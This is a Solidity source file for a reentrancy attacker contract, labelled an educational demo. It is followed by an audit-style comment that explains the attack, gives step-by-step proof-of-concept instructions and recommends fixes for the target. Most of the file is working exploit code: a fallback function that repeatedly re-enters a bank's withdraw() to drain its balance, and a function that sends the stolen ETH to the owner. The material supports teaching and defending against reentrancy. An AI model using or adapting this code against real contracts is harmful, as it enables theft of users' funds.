// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/*
=========================================================
PRACTICAL: Reentrancy Attacker Contract
CONCEPT: Recursive ETH drain
=========================================================

WARNING:
This is an EDUCATIONAL ATTACK DEMO ONLY.

Do NOT deploy against real contracts.
=========================================================
*/

interface IVulnerableBank {
    function withdraw(uint256 amount) external;
    function deposit() external payable;
}

/*
=========================================================
ATTACK CONTRACT
=========================================================
*/

contract ReentrancyAttacker {

    IVulnerableBank public bank;
    address public owner;

    uint256 public attackAmount;
    bool public attacking;

    constructor(address _bank) {
        bank = IVulnerableBank(_bank);
        owner = msg.sender;
    }

    /*
    =====================================================
    START ATTACK
    =====================================================
    */

    function attack() external payable {
        require(msg.sender == owner, "Only owner");

        /*
            Store attack amount
        */
        attackAmount = msg.value;

        /*
            Step 1:
            Deposit ETH into vulnerable bank
        */
        bank.deposit{value: msg.value}();

        /*
            Step 2:
            Start withdrawal (triggers reentrancy)
        */
        attacking = true;
        bank.withdraw(msg.value);
        attacking = false;
    }

    /*
    =====================================================
    FALLBACK FUNCTION (REENTRANCY POINT)
    =====================================================
    */

    fallback() external payable {

        /*
        =================================================
        CRITICAL REENTRANCY LOOP
        =================================================

        This runs when bank sends ETH back.

        BEFORE bank updates balance,
        attacker re-enters withdraw().
        */

        if (attacking) {

            uint256 bankBalance =
                address(bank).balance;

            /*
                Continue attacking while bank has funds.
            */
            if (bankBalance >= attackAmount) {

                bank.withdraw(attackAmount);
            }
        }
    }

    /*
    =====================================================
    COLLECT STOLEN ETH
    =====================================================
    */

    function withdrawStolen() external {
        require(msg.sender == owner, "Only owner");

        payable(owner).transfer(address(this).balance);
    }

    /*
    =====================================================
    VIEW CONTRACT BALANCE
    =====================================================
    */

    function getBalance()
        external
        view
        returns (uint256)
    {
        return address(this).balance;
    }
}
/*
Audit Report

Title: No Vulnerability – Reentrancy Attack Demonstration Contract

Severity: Informational

Location:
Contract: ReentrancyAttacker

Description:
The ReentrancyAttacker contract is intentionally designed to demonstrate
how a reentrancy attack can exploit a vulnerable contract. It is not
intended to securely hold or manage user funds.

The contract deposits ETH into a vulnerable bank contract and repeatedly
re-enters the withdraw() function through its fallback() function before
the bank updates its internal balance.

This behavior is expected and serves as a proof-of-concept (PoC) for
testing and educational purposes.

Impact:
None.

The contract itself does not introduce a vulnerability. Instead, it
illustrates the exploitation of an existing reentrancy vulnerability in
the target contract (VulnerableBank).

Proof of Concept:

1. Deploy VulnerableBank.
2. Deposit ETH into VulnerableBank from one or more accounts.
3. Deploy ReentrancyAttacker with the bank's address.
4. Call attack() with ETH.
5. The fallback() function repeatedly calls withdraw().
6. Funds are drained from VulnerableBank until its balance is insufficient.

Root Cause:
No vulnerability exists within ReentrancyAttacker.

The contract intentionally performs recursive calls to exploit the
Checks-Effects-Interactions violation present in VulnerableBank.

Recommendation:
No changes are required.

This contract should only be used in testing environments and educational
demonstrations. The correct mitigation is to patch the vulnerable target
contract by:
- Following the Checks-Effects-Interactions pattern.
- Updating state before external calls.
- Using a reentrancy guard (e.g., ReentrancyGuard).
- Minimizing unnecessary external interactions.

*/